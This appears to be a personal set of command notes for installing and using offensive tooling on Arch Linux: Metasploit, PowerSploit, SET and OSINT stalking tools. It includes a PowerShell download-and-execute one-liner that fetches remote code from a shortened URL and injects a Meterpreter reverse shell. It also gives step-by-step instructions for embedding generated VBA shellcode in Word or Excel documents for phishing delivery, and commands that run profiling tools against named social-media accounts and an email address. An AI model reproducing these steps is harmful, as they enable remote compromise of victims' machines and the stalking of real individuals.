#Metasploit#

	*sudo pacman -S dradis
	git clone git://github.com/rapid7/metasploit-framework.git /opt/framework
	
	sudo pacman -S postgresql
	sudo -i -u postgres
	initdb --locale en_US.UTF-8 -E UTF8 -D '/var/lib/postgres/data'
	exit
	sudo systemctl start postgresql
	sudo systemctl enable postgresql
	sudo -i -u postgres
	createuser ck -P -S -R -D
	createdb -O ck msf

	mkdir rvm && cd rvm
	curl -L https://get.rvm.io | bash -s stable --autolibs=enabled --ruby=1.9.3
	source ~/.rvm/scripts/rvm
	sudo nano ~/.bash_profile
		export PATH="$PATH:$HOME/.rvm/bin" # Add RVM to PATH for scripting
		[[ -s "$HOME/.rvm/scripts/rvm" ]] && source "$HOME/.rvm/scripts/rvm" # Load RVM$
	sudo nano ~/.profile
		export PATH="$PATH:$HOME/.rvm/bin" # Add RVM to PATH for scripting
		[[ -s "$HOME/.rvm/scripts/rvm" ]] && source "$HOME/.rvm/scripts/rvm" # Load RVM$
	rvm use --create --default 1.9.3-p457@msf
	cd /opt/framework
	gem install bundle
	bundle install

	msfconsole
	db_connect ck:msf@127.0.0.1:5432/msf
	db_status

	cd /opt/framework
	touch database.yml
	nano database.yml
	production:
	    adapter: postgresql
	    database: msf_database
	    username: msf_user
	    password: yourmsfpassword
	    host: 127.0.0.1
	    port: 5432
	    pool: 75
	    timeout: 5
	
	alias msf="msfconsole -y database.yml"
	bundle show pcaprub


#powersploit setup#

	git clone https://github.com/mattifestation/PowerSploit
	start metasploit listener: 
	use exploit/multi/handler 
	set payload windows/meterpreter/reverse_https
	set lhost 192.168.56.102
	set lport 4444

	$Env:PSModulePath
	Import-Module /path/PowerSploit.psd1
	Get-Command -Module PowerSploit
	Invoke-Shellcode.ps1 -Payload windows/meterpreter/reverse_https -Lhost 192.168.56.1 -Lport 4444
	IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/14bZZ0c’); Invoke-Shellcode –Payload windows/meterpreter/reverse_http –Lhost 192.168.56.101 –Lport 443 –Force

#Shellcode via macro#

	use payload/windows/meterpreter/reverse_tcp
	set LHOST 192.168.56.102
	set LPORT 443
	generate -t vba
	exploit 

	(1)Open any word or Excel document
	(2)Click on view & then click on Macros.
	(3)Give name to macro & create macro.
	(4)Remove all things from modules windows & Paste our generated VB code.
	(5)Saved it as type Word Macro-Enabled Document.

	use exploit/multi/handler 
	set lhost 192.168.56.102
	set lport 443
	set payload windows/meterpreter/reverse_tcp
	set autorunscript migrate -n explorer.exe
	exploit

#Persistent macro#

	Open SET > Social-Engineering Attacks > Powershell Attack Vectors
	Generate Powershell Alphanumeric Shellcode Injector
	Fill LHOST & LPORT value
	payload is located into /root/.set/reports/powershell/
	Rename x86_powershell_injection.txt to x32.ps1.
	git clone https://github.com/enigma0x3/Powershell-Payload-Excel-Delivery.git
	cd Powershell-payload-Excel-Delivery/
	Open MacroCode file & change Download URL for Invoke-Shellcode file & change LHOST & LPORT option.
	add this macro code into excel document
	setup listener


#OSINT#
	osint stalker

	git clone https://github.com/milo2012/osintstalker
	sudo pacman -S chromedriver
	sudo pacman -S python-setuptools
	sudo pacman -S python2-setuptools
	sudo pacman -S python-pip
	sudo easy_install-2.7 pip==1.2.1
	sudo pip-2.7 install pytz>=2013b
	sudo pip-2.7 install tzlocal
	sudo pip-2.7 install termcolor
	sudo pip-2.7 install selenium
	sudo pip-2.7 install requests --upgrade
	sudo pip-2.7 install beautifulsoup4 
	sudo pip-2.7 install httplib2
	sudo pip-2.7 install google
	sudo pip-2.7 install python-instagram
	sudo pip-2.7 install pygoogle
	sudo pip-2.7 install geopy>=1.3.0
	sudo pip-2.7 install lxml
	sudo pip-2.7 install oauth2
	sudo pip-2.7 install python-linkedin
	sudo pip-2.7 install pygeocoder
	sudo pip-2.7 install pysqlite
	sudo pip-2.7 install TwitterSearch
	sudo pip-2.7 install foursquare
	git clone https://github.com/hadim/pygraphml.git
	cd pygraphml
	sudo python2.7 setup.py install	
	Edit fbstalker.py and update facebook_username (same as email address) and facebook_password
	python fbstalker.py -user [facebook target username]
	wget https://gdata-python-client.googlecode.com/files/gdata-2.0.18.tar.gz
	tar xvf gdata-2.0.18.tar.gz
	cd gdata-2.0.18
	sudo python2.7 setup.py install
	sudo python2.7 geostalker.py
	
	tifoleak

	git clone https://github.com/vaguileradiaz/tinfoleak
	wget http://vicenteaguileradiaz.com/download/tinfoleak/tinfoleak-1.2.tar.gz
	edit tinfoleak.py and replace 'api = tweepy.API(auth)' with 'api = tweepy.API(auth, secure = True)'
	edit /usr/lib/python2.7/site-packages/tweepy/api.py and replace '/1' with '/1.1'
	python2.7 tinfoleak.py -n iamckn -sbt
	python2.7 tinfoleak.py -n iamckn -gtc 25

	scythe

	git clone https://github.com/ChrisJohnRiley/Scythe
	python2.7 scythe.py  --category=all --account=kamaucb@yahoo.com

	Maltego
	
	sudo pacman -S maltego

#SET#
	sudo pacman -S set-git
	sudo pacman -S python2-expect //dependencies - python2-pexpect, python2-crypto, python2-openssl, python2-pefile
	sudo nano set_config.pacsave //set metasploit path
	cd /usr/src/SET
	sudo ./setoolkit


#SECURITY_APPS#

	sudo pacman -S cupp
	sudo pacman -S crunch
	sudo pacman -S hydra

	sudo pacman -S creepy
	sudo pacman -S maltego
	sudo pacman -S recon-ng
	sudo pacman -S theharvester

